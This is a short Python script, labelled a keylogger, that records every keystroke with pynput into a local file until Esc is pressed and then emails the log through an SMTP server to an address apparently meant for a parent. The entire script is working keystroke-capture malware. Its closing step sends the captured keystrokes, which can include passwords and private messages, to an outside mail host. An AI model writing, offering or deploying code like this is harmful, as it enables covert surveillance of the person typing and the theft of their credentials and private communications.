from pynput.keyboard import Key, Listener
import smtplib
from email.mime.text import MIMEText

def on_press(key):
    # Write the pressed key to a file
    with open("log.txt", "a") as f:
        f.write(str(key) + "\n")

def on_release(key):
    # Stop the listener when the 'esc' key is pressed
    if key == Key.esc:
        return False

def send_email(subject, body):
    # Configure email settings
    sender_email = "your_email@example.com"
    receiver_email = "parent_email@example.com"
    password = "your_email_password"

    # Create email message
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender_email
    msg['To'] = receiver_email

    # Send email
    with smtplib.SMTP('smtp.example.com', 587) as server:
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, msg.as_string())

# Start the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Send the captured data as an email
with open("log.txt", "r") as f:
    data = f.read()
send_email("Keylogger Data", data)
